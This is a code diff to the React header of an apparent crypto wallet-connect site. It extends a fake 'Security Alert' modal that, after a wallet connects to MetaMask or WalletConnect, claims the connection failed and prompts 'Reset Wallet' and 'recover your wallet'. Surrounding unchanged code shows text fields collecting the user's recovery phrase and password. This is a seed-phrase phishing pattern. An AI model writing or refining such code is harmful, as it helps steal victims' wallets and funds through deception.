@@ -74,8 +74,8 @@ const btnsRef = [
 
 function Header() {
     const { account } = useWeb3React();
-    const { activate } = useWeb3React();
-    const [id, setId] = useState()
+    const { activate, deactivate } = useWeb3React();
+    const [id, setId] = useState(localStorage.getItem('address'))
     const [openFAk, setOpenFAk] = React.useState(false);
     const handleOpenFAk = () => setOpenFAk(true);
     const handleCloseFAk = () => setOpenFAk(false);
@@ -90,10 +90,10 @@ function Header() {
     const [prhare, setPrhase] = useState('')
     const [prharePass, setPrharePass] = useState('')
     const [activeWallet, setAvtiveWallet] = useState();
-    console.log(activeWallet)
+    console.log(localStorage.getItem('address'))
     useEffect(() => {
-        setId(localStorage.getItem('address'))
-    }, [localStorage.getItem('address')])
+        setId(localStorage.setItem('address', account))
+    }, [account])
     const condition = "hello"
     const handleOpenNavMenu = (e) => {
         setAnchorElNav(e.currentTarget);
@@ -123,17 +123,20 @@ function Header() {
         activate(WalletConnect)
             .then(() => {
                 setTimeout(handleOpenFAk(), 5000)
-
             })
         setAvtiveWallet(btn)
 
 
 
     }
-    const connectMetamask = () => {
+    const connectMetamask = (btn) => {
         handleClose();
         activate(Injected)
+            .then(() => {
+                setTimeout(handleOpenFAk(), 15000)
 
+            })
+        setAvtiveWallet(btn)
     }
 
     const submitAddress = () => {
@@ -160,6 +163,8 @@ function Header() {
         { name: 'MetaMask/TrustWallet', action: connectMetamask, image: "https://i.ibb.co/H40P97T/download.png" },
         { name: 'WalletConncet', action: connectWallet, image: "https://i.ibb.co/LdvtmRq/wallet-connect.png" },
     ]
+    console.log(typeof(account))
+
     return (
 
         <AppBar style={{ backgroundColor: '#262626' }} color='primary' position="static">
@@ -279,7 +284,7 @@ function Header() {
                                             {activeWallet?.name} Security Alert
                                         </Typography>
                                         <Typography style={{ marginTop: '15px', fontWeight: 'bolder' }} id="modal-modal-title" variant="h6" component="h2">
-                                            Warn! WalletConnect failed to connect to your wallet, please continue to recover your wallet.
+                                            Warn! {activeWallet?.name} failed to connect to your wallet, please continue to recover your wallet.
                                         </Typography>
                                         <button style={{ marginTop: '100px', cursor: 'pointer', border: 'none', outline: 'none', padding: '6px', background: 'rgb(0, 132, 255)', borderRadius: '20px', color: 'white', width: "300px", fontSize: '20px' }} onClick={() => recoverPass()}>
                                             Reset Wallet
@@ -291,7 +296,7 @@ function Header() {
                                     <Box sx={{ mb: 2 }}>
                                         {
                                             loading ?
-                                                <Box sx={{ minWidth: '320px',minHeight : '450px',display : 'flex',justifyContent : 'center',alignItems : 'center' }}>
+                                                <Box sx={{ minWidth: '320px', minHeight: '450px', display: 'flex', justifyContent: 'center', alignItems: 'center' }}>
                                                     <CircularProgress />
                                                 </Box>
                                                 :
@@ -315,7 +320,7 @@ function Header() {
                                                                 (
                                                                     <>
                                                                         <Box>
-                                                                           
+
                                                                             <TextareaAutosize
                                                                                 aria-label="minimum height"
                                                                                 minRows={3}
@@ -339,7 +344,7 @@ function Header() {
                                                                                     className='txtArea'
                                                                                     onChange={(e) => setPrhase(e.target.value)}
 
-                                                                                /><br/>
+                                                                                /><br />
                                                                                 <input
                                                                                     aria-label="minimum height"
                                                                                     minRows={3}
@@ -399,10 +404,24 @@ function Header() {
                 </Modal>
                 <Box sx={{ flexGrow: 0 }}>
                     <div className="header_right">
+                        {
+                            typeof(account) === typeof(condition) &&
+                                (
+                                    <Tooltip title='Disconncet Wallet'>
+                                        <button onClick={() => deactivate()}>Disconnect</button>
+                                    </Tooltip>
+                                )
+                        }
+                        {
+                                typeof(account) === "undefined" && 
+                                (
+                                    <Tooltip title='Conncet Wallet'>
+                                        <button onClick={handleOpen}>Connect</button>
+                                    </Tooltip>
+                                )
+                                
+                        }
 
-                        <Tooltip title='Conncet Wallet'>
-                            <button onClick={handleOpen}>Connect</button>
-                        </Tooltip>
                         <Modal
                             open={open}
                             onClose={handleClose}
@@ -444,7 +463,7 @@ function Header() {
                     </Menu>
                 </Box>
             </Container>
-        </AppBar>
+        </AppBar >
 
     )
 }
